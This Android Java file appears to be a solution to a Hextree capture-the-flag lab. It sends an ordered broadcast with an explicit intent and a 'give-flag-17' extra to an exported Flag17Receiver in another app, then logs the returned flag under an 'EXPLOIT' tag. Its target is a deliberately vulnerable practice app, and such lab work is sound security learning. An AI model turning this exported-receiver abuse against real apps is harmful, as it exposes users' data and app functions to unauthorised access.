package com.example.practicapp;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityHextree extends AppCompatActivity {
    private int counting = 0;
    private Uri maliciousUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);


        b1.setOnClickListener(v -> {
            // Setting the action required by the target
            Intent intent = new Intent();
            intent.putExtra("flag","give-flag-17");
            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");


                // 🔴 IMPORTANT: Set the correct action (you need to find this from manifest)
                intent.setAction("io.hextree.attacksurface.RECEIVE_FLAG17");

                // Required extra
                intent.putExtra("flag", "give-flag-17");

                // Receiver to capture result
                BroadcastReceiver resultReceiver = new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context ctx, Intent intent) {
                        Bundle result = getResultExtras(true);

                        if (result != null) {
                            boolean success = result.getBoolean("success", false);
                            String flag = result.getString("flag");

                            Log.i("EXPLOIT", "Success: " + success);
                            Log.i("EXPLOIT", "Flag: " + flag);
                            t1.setText("Success: " + success + "\nFlag: " + flag);
                        }
                    }
                };

                // Send ORDERED broadcast
                sendOrderedBroadcast(
                        intent,
                        null, // no permission required
                        resultReceiver,
                        null,
                        0,
                        null,
                        null
                );
        });
    }

}
